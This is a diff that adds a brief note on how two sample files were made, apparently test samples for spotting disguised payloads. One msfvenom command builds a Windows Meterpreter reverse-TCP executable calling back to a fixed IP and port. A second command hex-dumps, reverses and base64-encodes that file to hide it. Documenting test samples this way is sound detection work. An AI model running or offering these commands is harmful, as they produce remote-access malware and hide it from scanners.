@@ -1,0 +1,7 @@
+notashell.exe was created with:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=205.140.100.1 LPORT=12345 -f exe > notashell.exe
+
+reallynotashell.hex.rev.base64 was created with:
+
+xxd notashell.exe | rev | base64 > reallynotashell.hex.rev.base64
